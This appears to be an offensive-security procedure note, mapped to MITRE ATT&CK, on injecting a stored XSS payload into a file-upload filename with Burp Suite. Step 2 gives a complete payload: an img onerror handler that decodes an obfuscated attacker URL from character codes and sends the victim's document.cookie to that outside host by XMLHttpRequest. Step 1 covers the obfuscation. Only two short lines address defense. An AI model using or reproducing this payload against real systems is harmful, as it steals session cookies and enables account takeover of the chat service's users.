---
tags:
  - xss
  - stored-xss
  - payload-injection
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Online-String-Tools]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: a6cc98a8-3435-4778-ac56-a66800899389
created_at: '2025-12-11T06:10:15.975Z'
updated_at: '2025-12-11T06:10:15.975Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
  - '[[TA0009]]'
mitre_techniques:
  - '[[T1059.007]]'
---
# Inject XSS Payload into Filename

## Summary

This procedure modifies the filename parameter in an intercepted upload request to inject a malicious XSS payload, exploiting lack of sanitization for JavaScript execution.

## Description

The vulnerability allows injection of JavaScript into the filename, which executes when rendered in the chat interface. Use tools to obfuscate the payload (e.g., ASCII conversion) and modify the request to include it, leading to cookie theft or arbitrary JS execution.

## Requirements

1. Intercepted upload request from Burp Suite.
2. Obfuscated payload ready (e.g., via Online String Tools).
3. Knowledge of XSS payload construction.

## Defense

Defensive measures and detection strategies:

- Sanitize and encode user inputs like filenames.
- Implement content security policy (CSP) to restrict script execution.

## Objectives

1. Inject executable JavaScript into the filename.
2. Ensure payload survives rendering.
3. Enable blind stored XSS.

## Instructions

### Step 1: Prepare Payload

**Context**: Obfuscate the attacker's URL in ASCII.

Use [[tools/Online-String-Tools]] to convert the URL to ASCII codes.

### Step 2: Modify Filename in Request

**Context**: Edit the intercepted request.

In Burp Suite, change the filename to \"><img src=1 onerror=\"url=String.fromCharCode(104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61)+encodeURIComponent(document.cookie);xhttp=new XMLHttpRequest();xhttp.open('GET',url,true);xhttp.send();\".

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used



## Tools Used

- [[tools/Burp-Suite]]
- [[tools/Online-String-Tools]]

## Tags

- xss
- stored-xss
- payload-injection
